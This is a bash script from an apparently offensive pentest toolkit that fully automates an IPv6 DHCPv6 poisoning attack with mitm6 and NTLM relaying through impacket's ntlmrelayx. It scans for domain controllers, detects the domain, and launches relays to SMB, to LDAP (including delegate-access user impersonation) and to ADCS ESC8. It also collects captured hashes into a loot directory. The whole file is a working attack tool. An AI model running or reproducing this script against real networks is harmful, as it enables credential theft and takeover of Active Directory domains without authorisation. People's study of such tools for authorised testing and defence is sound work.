#!/usr/bin/env bash
source "$(dirname "$0")/../lib.sh"
set -uo pipefail

banner "MITM6" "IPv6 DHCPv6 poisoning → NTLM relay via rogue DNS"

# ── Tool checks ────────────────────────────────────────────────────────────────
section "TOOLS"

if ! command -v mitm6 &>/dev/null; then
  printf '  %s[!]%s mitm6 not found.\n' "${RED}" "${RESET}"
  printf '      pip3 install mitm6\n\n'; exit 1
fi
printf '  %s[✓]%s mitm6   : %s%s%s\n' "${GREEN}" "${RESET}" "${DIM}" "$(command -v mitm6)" "${RESET}"

_relay_cmd=""
for _r in impacket-ntlmrelayx ntlmrelayx.py; do
  command -v "$_r" &>/dev/null && { _relay_cmd="$_r"; break; }
done
if [[ -z "$_relay_cmd" ]]; then
  printf '  %s[!]%s ntlmrelayx not found — pip3 install impacket\n' "${RED}" "${RESET}"; exit 1
fi
printf '  %s[✓]%s relay   : %s%s%s\n\n' "${GREEN}" "${RESET}" "${DIM}" "$_relay_cmd" "${RESET}"

# ── Interface selection ────────────────────────────────────────────────────────
section "INTERFACE"

mapfile -t _ifaces < <(ip -o link show 2>/dev/null \
  | awk -F': ' '{print $2}' | awk '{print $1}' \
  | grep -v '^lo$' | grep -vE '^(rmnet|r_rmnet|bond|dummy)' || true)

if [[ ${#_ifaces[@]} -eq 0 ]]; then
  printf '  %s[!]%s No usable network interfaces found.\n' "${RED}" "${RESET}"; exit 1
fi

for i in "${!_ifaces[@]}"; do
  _ip=$(ip -o -4 addr show "${_ifaces[$i]}" 2>/dev/null | awk '{print $4}' | head -1)
  printf '  %s[%02d]%s  %-14s  %s%s%s\n' \
    "${CYAN}" "$((i+1))" "${RESET}" "${_ifaces[$i]}" "${DIM}" "${_ip:-no IPv4}" "${RESET}"
done

if [[ -n "${SESSION_DIR:-}" ]]; then
  IFACE="$(resolve_iface any)"
  printf '  %s[CHAIN]%s Interface: %s%s%s  (auto-detected)\n\n' \
    "${CYAN}" "${RESET}" "${GREEN}" "$IFACE" "${RESET}"
else
  printf '\n  %s>>%s Interface [1]: ' "${CYAN}" "${RESET}"
  read -r _sel; _sel="${_sel:-1}"
  if ! [[ "$_sel" =~ ^[0-9]+$ ]] || (( _sel < 1 || _sel > ${#_ifaces[@]} )); then
    printf '  %s[!]%s Invalid selection.\n' "${RED}" "${RESET}"; exit 1
  fi
  IFACE="${_ifaces[$((_sel-1))]}"
fi
IP_CIDR=$(ip -o -4 addr show "$IFACE" 2>/dev/null | awk '{print $4}' | head -1)
IP_ADDR="${IP_CIDR%%/*}"
PREFIX="${IP_CIDR##*/}"

if [[ -z "$IP_ADDR" ]]; then
  printf '  %s[!]%s No IPv4 on %s — pick a different interface.\n' \
    "${RED}" "${RESET}" "$IFACE"; exit 1
fi

IFS='.' read -r _i1 _i2 _i3 _ <<< "$IP_ADDR"
SUBNET="${_i1}.${_i2}.${_i3}.0/${PREFIX:-24}"
printf '\n  %s[SYS]%s Interface : %s%s%s\n' "${CYAN}" "${RESET}" "${GREEN}" "$IFACE"  "${RESET}"
printf '  %s[SYS]%s IP        : %s%s%s\n'  "${CYAN}" "${RESET}" "${GREEN}" "$IP_ADDR" "${RESET}"
printf '  %s[SYS]%s Subnet    : %s%s%s\n'  "${CYAN}" "${RESET}" "${DIM}"   "$SUBNET"  "${RESET}"

# ── DC / AD discovery ──────────────────────────────────────────────────────────
section "DC / AD DISCOVERY"

declare -a DC_HOSTS=()

# Try to reuse an existing nmap.txt from a prior scan
_nmap_load="$(pick_nmap_file)"

if [[ -n "$_nmap_load" ]]; then
  _nmap_txt="${_nmap_load##*|}"
  printf '  %s[*]%s Parsing nmap.txt for DC indicators (ports 88/389/636)...\n' \
    "${CYAN}" "${RESET}"
  _cur=""
  while IFS= read -r _line; do
    if [[ "$_line" =~ scan\ report\ for\ ([0-9]+\.[0-9]+\.[0-9]+\.[0-9]+) ]]; then
      _cur="${BASH_REMATCH[1]}"
    elif [[ -n "$_cur" && "$_line" =~ ^(88|389|636)/tcp.*open ]]; then
      _seen=0
      for _h in "${DC_HOSTS[@]+"${DC_HOSTS[@]}"}"; do [[ "$_h" == "$_cur" ]] && _seen=1; done
      if (( _seen == 0 )); then
        DC_HOSTS+=("$_cur")
        printf '  %s[+]%s DC candidate : %s\n' "${GREEN}" "${RESET}" "$_cur"
      fi
    fi
  done < "$_nmap_txt"
  [[ ${#DC_HOSTS[@]} -eq 0 ]] && \
    printf '  %s[~]%s No DC ports in nmap.txt — running fresh scan.\n' "${YELLOW}" "${RESET}"
fi

if [[ ${#DC_HOSTS[@]} -eq 0 ]]; then
  printf '  %s[*]%s Scanning %s for DC services (88/389/636/445)...\n' \
    "${CYAN}" "${RESET}" "$SUBNET"

  start_spin "nmap scan"
  mapfile -t _dc_scan < <(
    nmap -sS -Pn -n -T4 --max-retries 2 --max-scan-delay 10ms --min-rate 300 \
         -p 88,389,445,636 --open "$SUBNET" 2>/dev/null
  )
  stop_spin

  _cur=""
  declare -a _cur_ports=()
  for _line in "${_dc_scan[@]}"; do
    if [[ "$_line" =~ scan\ report\ for\ ([0-9]+\.[0-9]+\.[0-9]+\.[0-9]+) ]]; then
      if [[ -n "$_cur" && ${#_cur_ports[@]} -gt 0 ]]; then
        for _p in "${_cur_ports[@]}"; do
          if [[ "$_p" == "88" || "$_p" == "389" || "$_p" == "636" ]]; then
            _seen=0
            for _h in "${DC_HOSTS[@]+"${DC_HOSTS[@]}"}"; do [[ "$_h" == "$_cur" ]] && _seen=1; done
            if (( _seen == 0 )); then
              DC_HOSTS+=("$_cur")
              printf '  %s[+]%s DC candidate : %s  %s(ports: %s)%s\n' \
                "${GREEN}" "${RESET}" "$_cur" "${DIM}" "${_cur_ports[*]}" "${RESET}"
            fi
            break
          fi
        done
      fi
      _cur="${BASH_REMATCH[1]}"; _cur_ports=()
    elif [[ -n "$_cur" && "$_line" =~ ^([0-9]+)/tcp.*open ]]; then
      _cur_ports+=("${BASH_REMATCH[1]}")
    fi
  done
  # commit last host
  if [[ -n "$_cur" && ${#_cur_ports[@]} -gt 0 ]]; then
    for _p in "${_cur_ports[@]}"; do
      if [[ "$_p" == "88" || "$_p" == "389" || "$_p" == "636" ]]; then
        _seen=0
        for _h in "${DC_HOSTS[@]+"${DC_HOSTS[@]}"}"; do [[ "$_h" == "$_cur" ]] && _seen=1; done
        if (( _seen == 0 )); then
          DC_HOSTS+=("$_cur")
          printf '  %s[+]%s DC candidate : %s  %s(ports: %s)%s\n' \
            "${GREEN}" "${RESET}" "$_cur" "${DIM}" "${_cur_ports[*]}" "${RESET}"
        fi
        break
      fi
    done
  fi
fi

# Select DC
DC_IP=""
if [[ ${#DC_HOSTS[@]} -eq 0 ]]; then
  if [[ -n "${SESSION_DIR:-}" ]]; then
    # Pipeline: try chain_dc.txt first
    DC_IP=""
    [[ -s "${SESSION_DIR}/chain_dc.txt" ]] && DC_IP=$(head -1 "${SESSION_DIR}/chain_dc.txt")
    [[ -z "$DC_IP" ]] && DC_IP="${TARGET%%/*}"
    printf '  %s[CHAIN]%s DC: %s%s%s  (chain_dc.txt / TARGET)\n' \
      "${CYAN}" "${RESET}" "${GREEN}" "${DC_IP:-none}" "${RESET}"
  else
    printf '  %s[~]%s No DC found automatically.\n' "${YELLOW}" "${RESET}"
    printf '  %s>>%s Enter DC IP manually (required for LDAP/ADCS modes, optional for SMB): ' \
      "${CYAN}" "${RESET}"
    read -r DC_IP
  fi
elif [[ ${#DC_HOSTS[@]} -eq 1 ]]; then
  DC_IP="${DC_HOSTS[0]}"
  printf '  %s[✓]%s DC auto-selected : %s%s%s\n' \
    "${GREEN}" "${RESET}" "${CYAN}" "$DC_IP" "${RESET}"
else
  if [[ -n "${SESSION_DIR:-}" ]]; then
    DC_IP="${DC_HOSTS[0]}"
    printf '  %s[CHAIN]%s DC auto-selected (first): %s%s%s\n' \
      "${CYAN}" "${RESET}" "${GREEN}" "$DC_IP" "${RESET}"
  else
    printf '\n  %s[*]%s Multiple DC candidates — select one:\n\n' "${CYAN}" "${RESET}"
    for _i in "${!DC_HOSTS[@]}"; do
      printf '  %s[%02d]%s  %s\n' "${CYAN}" "$((_i+1))" "${RESET}" "${DC_HOSTS[$_i]}"
    done
    printf '\n  %s>>%s Select [1]: ' "${CYAN}" "${RESET}"
    read -r _dp; _dp="${_dp:-1}"
    if [[ "$_dp" =~ ^[0-9]+$ ]] && (( _dp >= 1 && _dp <= ${#DC_HOSTS[@]} )); then
      DC_IP="${DC_HOSTS[$((_dp-1))]}"
    else
      DC_IP="${DC_HOSTS[0]}"
    fi
    printf '  %s[✓]%s DC selected : %s%s%s\n' \
      "${GREEN}" "${RESET}" "${CYAN}" "$DC_IP" "${RESET}"
  fi
fi

# ── Domain detection ───────────────────────────────────────────────────────────
section "DOMAIN"

_auto_domain="$(grep -E '^(domain|search)' /etc/resolv.conf 2>/dev/null \
  | head -1 | awk '{print $2}' || true)"

# Try LDAP anonymous bind against discovered DC
if [[ -z "${_auto_domain:-}" && -n "$DC_IP" ]] && command -v ldapsearch &>/dev/null; then
  printf '  %s[*]%s Trying LDAP anonymous bind on %s...\n' "${CYAN}" "${RESET}" "$DC_IP"
  _ldap_raw="$(timeout 4 ldapsearch -x -H "ldap://$DC_IP" -b '' -s base \
    defaultNamingContext 2>/dev/null || true)"
  _dc_parts="$(printf '%s' "$_ldap_raw" \
    | grep -oiE 'DC=[^,]+' | sed 's/DC=//Ig' | paste -sd '.' 2>/dev/null || true)"
  [[ -n "${_dc_parts:-}" ]] && _auto_domain="$_dc_parts" && \
    printf '  %s[+]%s Domain detected via LDAP : %s%s%s\n' \
      "${GREEN}" "${RESET}" "${CYAN}" "$_auto_domain" "${RESET}"
fi

if [[ -n "${SESSION_DIR:-}" ]]; then
  DOMAIN="${DOMAIN:-}"
  [[ -z "$DOMAIN" && -s "${SESSION_DIR}/chain_domain.txt" ]] && DOMAIN=$(head -1 "${SESSION_DIR}/chain_domain.txt")
  [[ -z "$DOMAIN" ]] && DOMAIN="${_auto_domain:-}"
  printf '  %s[CHAIN]%s Domain: %s%s%s  (auto)\n' \
    "${CYAN}" "${RESET}" "${GREEN}" "${DOMAIN:-<none>}" "${RESET}"
else
  printf '  %s>>%s Domain (e.g. corp.local)' "${CYAN}" "${RESET}"
  [[ -n "${_auto_domain:-}" ]] && printf ' %s[detected: %s]%s' "${DIM}" "$_auto_domain" "${RESET}"
  printf ': '
  read -r DOMAIN
  [[ -z "$DOMAIN" ]] && DOMAIN="${_auto_domain:-}"
fi

if [[ -z "$DOMAIN" ]]; then
  printf '  %s[!]%s Domain is required — mitm6 filters DHCPv6 by domain name.\n' \
    "${RED}" "${RESET}"; exit 1
fi

printf '\n  %s[SYS]%s Domain : %s%s%s\n' "${CYAN}" "${RESET}" "${GREEN}" "$DOMAIN" "${RESET}"
[[ -n "$DC_IP" ]] && \
  printf '  %s[SYS]%s DC IP  : %s%s%s\n' "${CYAN}" "${RESET}" "${GREEN}" "$DC_IP"  "${RESET}"
printf '\n'

# ── Relay mode ─────────────────────────────────────────────────────────────────
section "RELAY MODE"

printf '  %s[01]%s SMB relay          %s→ exec / file access on hosts without SMB signing%s\n' \
  "${CYAN}" "${RESET}" "${DIM}" "${RESET}"
printf '  %s[02]%s LDAP relay         %s→ dump AD data · safe · works even with SMB signing%s\n' \
  "${CYAN}" "${RESET}" "${DIM}" "${RESET}"
printf '  %s[03]%s LDAP + delegate    %s→ create machine acct + delegation → impersonate any user%s\n' \
  "${CYAN}" "${RESET}" "${DIM}" "${RESET}"
printf '  %s[04]%s LDAPS + ADCS       %s→ relay to ADCS ESC8 → request cert → NT hash (needs ADCS)%s\n\n' \
  "${CYAN}" "${RESET}" "${DIM}" "${RESET}"

if [[ -n "${SESSION_DIR:-}" ]]; then
  _mode=2  # LDAP relay — works even with SMB signing, safest for pipeline
  printf '  %s[CHAIN]%s Mode: LDAP relay (pipeline auto-select)%s\n\n' "${CYAN}" "${RESET}" "${RESET}"
else
  printf '  %s>>%s Mode [1]: ' "${CYAN}" "${RESET}"
  read -r _mode; _mode="${_mode:-1}"
fi

# Validate DC IP is available for LDAP/ADCS modes
if [[ "$_mode" =~ ^[234]$ && -z "$DC_IP" ]]; then
  printf '\n  %s[!]%s DC IP required for LDAP/ADCS relay but none found.\n' "${RED}" "${RESET}"
  printf '  %s>>%s Enter DC IP: ' "${CYAN}" "${RESET}"
  read -r DC_IP
  [[ -z "$DC_IP" ]] && { printf '  %s[!]%s Aborted.\n' "${RED}" "${RESET}"; exit 1; }
fi

# ── Output dirs ────────────────────────────────────────────────────────────────
outdir="$(make_outdir)"
MITM6_LOG="$outdir/mitm6.log"
RELAY_LOG="$outdir/ntlmrelayx.log"
HASHES_FILE="$outdir/captured_hashes.txt"
LOOT_DIR="$outdir/loot"
mkdir -p "$LOOT_DIR"

# ── Relay target discovery (SMB mode only) ─────────────────────────────────────
TARGETS_FILE="$outdir/relay_targets.txt"
: > "$TARGETS_FILE"

if [[ "$_mode" == "1" ]]; then
  section "RELAY TARGET DISCOVERY"
  printf '  %s[*]%s Scanning %s for SMB hosts...\n' "${CYAN}" "${RESET}" "$SUBNET"

  start_spin "nmap -p445"
  nmap -sS -Pn -n -T4 --max-retries 2 --max-scan-delay 10ms --min-rate 300 \
    -p 445 --open "$SUBNET" 2>/dev/null \
    | grep "Nmap scan report for" | awk '{print $NF}' \
    | tr -d '()' > "$TARGETS_FILE" || true
  stop_spin

  _tcount=0
  [[ -s "$TARGETS_FILE" ]] && _tcount=$(wc -l < "$TARGETS_FILE")
  printf '  %s[+]%s %d SMB host(s) found as relay targets\n' "${GREEN}" "${RESET}" "$_tcount"

  if (( _tcount == 0 )); then
    printf '  %s[~]%s No targets — mitm6 will still run but relay has no targets.\n' \
      "${YELLOW}" "${RESET}"
    printf '  %s[~]%s Consider mode 2 (LDAP) which does not need a target list.\n\n' \
      "${YELLOW}" "${RESET}"
    if [[ -z "${SESSION_DIR:-}" ]]; then
      printf '  %s>>%s Continue anyway? [y/N]: ' "${CYAN}" "${RESET}"
      read -r _cont
      [[ "${_cont,,}" != "y" ]] && exit 0
    fi
  fi
fi

# ── Cleanup trap ───────────────────────────────────────────────────────────────
MITM6_PID=""
_cleanup() {
  printf '\n\n  %s[*]%s Shutting down...\n' "${CYAN}" "${RESET}"
  if [[ -n "$MITM6_PID" ]]; then
    kill "$MITM6_PID" 2>/dev/null || true
    wait "$MITM6_PID" 2>/dev/null || true
  fi
  printf '\n'
  if [[ -s "$HASHES_FILE" ]]; then
    printf '  %s[+]%s Captured hashes:\n\n' "${GREEN}" "${RESET}"
    while IFS= read -r _h; do
      printf '    %s%s%s\n' "${GREEN}" "$_h" "${RESET}"
    done < "$HASHES_FILE"
    printf '\n'
  fi
  printf '  %s[SYS]%s mitm6 log  : %s%s%s\n' "${CYAN}" "${RESET}" "${DIM}" "$MITM6_LOG"  "${RESET}"
  printf '  %s[SYS]%s relay log  : %s%s%s\n' "${CYAN}" "${RESET}" "${DIM}" "$RELAY_LOG"   "${RESET}"
  printf '  %s[SYS]%s loot dir   : %s%s%s\n' "${CYAN}" "${RESET}" "${DIM}" "$LOOT_DIR"    "${RESET}"
  # Pipeline chain: publish captured hashes → chain_hashes.txt
  if [[ -n "${SESSION_DIR:-}" ]] && [[ -s "$HASHES_FILE" ]]; then
    cat "$HASHES_FILE" >> "${SESSION_DIR}/chain_hashes.txt" 2>/dev/null || true
    sort -u "${SESSION_DIR}/chain_hashes.txt" -o "${SESSION_DIR}/chain_hashes.txt" 2>/dev/null || true
    _hh=$(wc -l < "${SESSION_DIR}/chain_hashes.txt" 2>/dev/null || echo 0)
    printf '  %s[CHAIN]%s chain_hashes.txt: %s hash(es) from mitm6 relay%s\n\n' \
      "${CYAN}" "${RESET}" "$_hh" "${RESET}"
  fi
  mark_done "$outdir"
}
trap '_cleanup' EXIT

# ── Build ntlmrelayx arguments ─────────────────────────────────────────────────
declare -a _relay_args=()
case "$_mode" in
  1) _relay_args=(-tf "$TARGETS_FILE" -smb2support -l "$LOOT_DIR" --output-file "$HASHES_FILE") ;;
  2) _relay_args=(-t "ldap://$DC_IP" --no-smb-server --no-http-server -l "$LOOT_DIR") ;;
  3) _relay_args=(-t "ldap://$DC_IP" --delegate-access --no-smb-server --no-http-server \
                  -l "$LOOT_DIR" --output-file "$HASHES_FILE") ;;
  4) _relay_args=(-t "ldaps://$DC_IP" --adcs --template Machine \
                  --no-smb-server --no-http-server --output-file "$HASHES_FILE") ;;
  *) _relay_args=(-tf "$TARGETS_FILE" -smb2support) ;;
esac

# ── Launch ─────────────────────────────────────────────────────────────────────
section "ATTACK"

printf '  %s[*]%s Starting mitm6 on %s%s%s (background)...\n' \
  "${CYAN}" "${RESET}" "${GREEN}" "$IFACE" "${RESET}"

mitm6 -i "$IFACE" -d "$DOMAIN" --no-ra > "$MITM6_LOG" 2>&1 &
MITM6_PID=$!
sleep 1

if ! kill -0 "$MITM6_PID" 2>/dev/null; then
  printf '  %s[!]%s mitm6 failed to start. Check log:\n' "${RED}" "${RESET}"
  tail -5 "$MITM6_LOG" 2>/dev/null | sed 's/^/    /'
  exit 1
fi

printf '  %s[+]%s mitm6 running (PID %d) — poisoning DHCPv6 for domain %s\n' \
  "${GREEN}" "${RESET}" "$MITM6_PID" "$DOMAIN"
printf '  %s[*]%s Waiting 2s for mitm6 to initialise...\n\n' "${CYAN}" "${RESET}"
sleep 2

case "$_mode" in
  1) printf '  %s[*]%s Mode: SMB relay → %d target(s)\n\n' "${CYAN}" "${RESET}" "$_tcount" ;;
  2) printf '  %s[*]%s Mode: LDAP relay → ldap://%s\n\n'   "${CYAN}" "${RESET}" "$DC_IP" ;;
  3) printf '  %s[*]%s Mode: LDAP + delegate-access → ldap://%s\n\n' "${CYAN}" "${RESET}" "$DC_IP" ;;
  4) printf '  %s[*]%s Mode: LDAPS + ADCS (ESC8) → ldaps://%s\n\n'   "${CYAN}" "${RESET}" "$DC_IP" ;;
esac

printf '  %s[*]%s Launching ntlmrelayx — %sCTRL+C to stop both processes%s\n\n' \
  "${CYAN}" "${RESET}" "${BOLD}" "${RESET}"

run_fg "$_relay_cmd" "${_relay_args[@]}" 2>&1 | (trap '' SIGINT; tee "$RELAY_LOG") || true
